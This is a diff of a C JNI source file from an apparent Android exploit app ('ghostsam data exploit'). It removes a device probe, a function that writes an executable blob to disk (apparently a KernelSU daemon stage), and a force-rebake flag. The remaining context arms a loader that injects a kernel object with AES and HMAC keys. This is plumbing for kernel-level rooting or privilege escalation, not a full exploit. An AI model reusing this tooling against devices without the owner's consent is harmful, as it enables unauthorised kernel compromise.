@@ -20,8 +20,6 @@
 #include <unistd.h>
 
 #include "dfr_loader.h"
-#include "dfr_core.h"
-#include "dfr_crypto.h"
 #include "dfr_kmi.h"
 #include "dfr_pin_probe.h"
 
@@ -81,22 +79,6 @@ static int sender_open(uint16_t port) {
 }
 
 JNIEXPORT jstring JNICALL
-Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_probe(JNIEnv *env,
-                                                            jclass clazz) {
-  out_t o = {{0}, 0};
-  char kmi[64];
-  (void)clazz;
-
-  if (dfr_kmi_current(kmi, sizeof(kmi)) == 0)
-    out_fmt(&o, "kmi=%s\n", kmi);
-  else
-    out_fmt(&o, "kmi=unknown\n");
-  out_fmt(&o, "uid=%d pid=%d\n", (int)getuid(), (int)getpid());
-  out_fmt(&o, "crypto=%s\n", dfr_crypto_selfcheck() == 0 ? "ok" : "fail");
-  return to_jstring(env, &o);
-}
-
-JNIEXPORT jstring JNICALL
 Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_pinProbe(JNIEnv *env,
                                                                jclass clazz,
                                                                jstring jdir) {
@@ -142,58 +124,6 @@ Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_kmi(JNIEnv *env,
   if (dfr_kmi_current(buf, sizeof(buf)) != 0)
     buf[0] = 0;
   return (*env)->NewStringUTF(env, buf);
-}
-
-JNIEXPORT jint JNICALL
-Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_ksudStage(
-    JNIEnv *env, jclass clazz, jstring jpath, jbyteArray jdata) {
-  const char *path;
-  char tmp[256];
-  jbyte *data;
-  jsize len, off = 0;
-  int fd, rc = 0;
-  (void)clazz;
-
-  if (jpath == NULL || jdata == NULL)
-    return -1;
-  path = (*env)->GetStringUTFChars(env, jpath, NULL);
-  if (path == NULL)
-    return -1;
-  len = (*env)->GetArrayLength(env, jdata);
-  if (len <= 0 || strlen(path) > 200) {
-    (*env)->ReleaseStringUTFChars(env, jpath, path);
-    return -1;
-  }
-  data = (*env)->GetByteArrayElements(env, jdata, NULL);
-  if (data == NULL) {
-    (*env)->ReleaseStringUTFChars(env, jpath, path);
-    return -1;
-  }
-  /* publish via temp + rename: the target path never holds a partial blob */
-  snprintf(tmp, sizeof(tmp), "%s.t", path);
-  fd = open(tmp, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0755);
-  if (fd < 0) {
-    rc = -errno;
-  } else {
-    while (off < len) {
-      ssize_t n = write(fd, data + off, (size_t)(len - off));
-      if (n <= 0) {
-        rc = -errno;
-        break;
-      }
-      off += (jsize)n;
-    }
-    if (rc == 0 && fchmod(fd, 0755) != 0)
-      rc = -errno;
-    close(fd);
-    if (rc == 0 && rename(tmp, path) != 0)
-      rc = -errno;
-    if (rc != 0)
-      unlink(tmp);
-  }
-  (*env)->ReleaseByteArrayElements(env, jdata, data, JNI_ABORT);
-  (*env)->ReleaseStringUTFChars(env, jpath, path);
-  return rc;
 }
 
 /* arm64 syscall number; older bionic headers may not define it */
@@ -291,8 +221,6 @@ Java_com_snothin_ghostsam_data_exploit_GsdfrAppNative_arm(
       dfr_loader_set_external_sa((uint32_t)jspi, (uint16_t)jencap_port,
                              g_sender_fd, (const uint8_t *)aes,
                              (const uint8_t *)hmac);
-      /* force re-bake: a stale container from a crashed run must not survive a ko change */
-      dfr_loader_set_force_rebake(1);
       dfr_loader_arm(kmi, (const uint8_t *)ko, (size_t)ko_len, buf, sizeof(buf));
       out_append(&o, buf);
     }
